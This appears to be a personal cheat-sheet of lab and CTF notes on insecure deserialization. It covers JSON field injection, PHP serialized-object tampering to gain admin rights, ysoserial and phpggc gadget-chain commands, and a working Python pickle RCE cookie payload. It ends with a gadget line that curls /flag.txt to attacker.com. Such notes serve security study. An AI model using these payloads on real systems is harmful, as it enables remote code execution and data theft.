//* insecure deserialization / object injection
//? JSON serialization format
// '{"username": "guest", "password": "guest", "flag": false}';
// '{"username": "name", "password": "pass"}';
// you can inject pass=    " , "password" : null , "flag" : true , "x" : "x
//? PHP serialization format
// user object
// $user->name = "carlos";
// $user->isLoggedIn = true;
// serialized user object
// O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
// object name - attributes number - s : string - b : boolean
//? Java serialization format
// starts with ac ed in hexadecimal and rO0 in Base64
//* php serialization modification
// https://onlinephp.io/code/f/serialize
// <?php
// class User {
//?    if private didn't work try public
//     public $username = "wiener";
//     public $admin = true;
// }

// $x = new User();

// $return = serialize($x);

// echo($return);
//* php 7
// 0 == 'any string' // true
//* php 8
// 0 == '0 any string' // true
//* Magic methods (called automatically)
// you can relly on these method even though they don't exist in your initial class but another one already defined
// __construct / __destruct /
//* Gadget chains
//? java
//? Apache Commons Collections library
// ==> java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
// ==> url encode the result and send it

//? php
//? Symfony
// ==> ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

//?python3
//? pickle
//import pickle
//import base64
//import os
//
//class RCE:
//    def __reduce__(self):
//        cmd = f'cat /flag.txt > /app/application/static/js/flag.txt'
//        return os.system, (cmd,)
//
//payload = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
//print("Cookie payload:", payload)

//? java
//? watersnake

//. !!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST  http://attacker.com"]
// you can instance a class by !!class_path_name ["params"]




